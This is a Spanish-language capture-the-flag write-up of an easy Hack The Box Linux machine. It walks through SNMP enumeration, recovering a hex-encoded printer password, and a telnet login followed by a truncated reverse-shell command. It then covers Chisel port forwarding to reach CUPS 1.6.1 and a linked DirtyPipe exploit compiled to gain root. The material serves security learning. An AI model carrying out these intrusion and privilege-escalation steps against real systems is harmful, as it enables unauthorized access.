
--- 
- Tags: #linux #HTB #Easy #SNMP #portforwarding #CVE 
- --
#### QUÉ SE EXPLOTA?

SNMP Enumeration
Network Printer Abuse
CUPS Administration Exploitation (ErrorLog)
EXTRA -> (DirtyPipe) [CVE-2022-0847]

#### Write UP

##### PRIMERA FASE: Reconocimiento

Como siempre empezamos **haciendo nuestros 2 escaneos de rutina** uno primario con un **syn scan** para descubrir todos los puertos abiertos y posteriormente **un segundo escaneo** para **determinar versiones y y algunos otros detalles** de los puertos previamente encontrados.


En este caso solo pudimos hacer el **syn scan** ya que el **segundo no se ejecuto**. El primer escaneo muestra al **puerto 23** abierto. 

![[Pasted image 20251024115711.png]]

**El puerto 23** hace referencia a **telnet** por lo que proseguimos a tratar de conectarnos con...

```bash

telnet 10.10.11.107 23
```

Únicamente descubrimos que nos queriamos conectar a: **HP JetDirect**

![[Pasted image 20251024120642.png]]

Ya que **únicamente encontramos 1 puerto TCP abierto, proseguimos a hacer un escaneo udp**

```bash

nmap -sU --top-ports 100 --open -T5 -n 10.10.11.107 -v

```

 ![[Pasted image 20251024121035.png]]

Encontramos el **puerto 161** que corresponde a **[[SNMP]]**
 con **[[snmpwalk]]** voy a hacer un recorrido para ver si descubrimos algo interesante en el [[SNMP]]

##### SEGUNDA FASE: Explotación

```bash

snmpwalk -c public -v2c ip 
```

`-c public` - Hace alusión a la community string es public
`-v2c` - Usa la versión SNMP v2c, la más común

Tenemos que recordar que **el programa lanza por defecto el OID 2** por lo que también hay que indicarle el valor **1** 

```bash

snmpwalk -c public -v2c ip 1
```

![[Pasted image 20251024144639.png]]
modificamos el **/etc/snmp/snmp.conf** para ver mejor la salida

*Tuvimos que instalar las MIBS necesarias para que no salieran errores*

```bash
sudo apt install snmp-mibs-downloader
sudo download-mibs
```

Una vez que hicimos la **enumeración con [[snmpwalk]]** proseguimos a ver lo que devolvió en la **raíz** . 

![[Pasted image 20251024150645.png]]

**Devolvió hexadecimal** por lo que proseguimos a ver si podemos revertir lo que codificaron. 

```bash

echo "cadena HEX" | xargs | xxd -ps -r
```

![[Pasted image 20251024150832.png]]

**Ahora** esa misma contraseña la ocupamos para ver si podemos comunicarnos a **[[telnet]]**

```bash

telnet ip port 

 ```

proporcionamos la contraseña y estamos dentro de **[[telnet]]**
**Dentro de telnet ejecutamos exec bash -c "bash -i >&..." para entablar una [[Reverse shell]]**
![[Pasted image 20251024170511.png]]


##### TERCERA FASE:  POST - Explotación

**Una vez que ganamos accesso** empezamos a buscar **vectores para escalar privilegios** 

```bash

id

find / -perm -4000 2>/dev/null 

netstat -nat

sudo -l 

getcap / -r 2>/dev/null
/usr/share/snmp/mibs
```

**Encontramos que había un puerto que estaba abierto** sin embargo, no podemos acceder a él desde fuera por lo que tenemos que aplicar un **Remote [[Port Forwarding]]** con **[[Chisel]]**

```bash

#Desde nuestra maquina/usr/share/snmp/mibs

chisel server --reverse -p 6809

# Desde la victima

chisel client nuestra_ip -R:631:127.0.0.1:631
```

**Inspeccionando lo que había** encontramos que hay una pagina donde aparece **[[CUPS 1.6.1]]** 

**[[CVE-2012-5519]]**

además de eso encontramos **que la maquina puede ser vulnerable a** **Dirty pipe** o **CVE-2022-0847 que afecta a versiones 5.8 y posteriores** 

[[CVE-2022-0847]](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c)

```bash

gcc prives.c -o privesc
```

*Lo compilamos* y listo **ganamos accesso root** 

![[Pasted image 20251024180930.png]]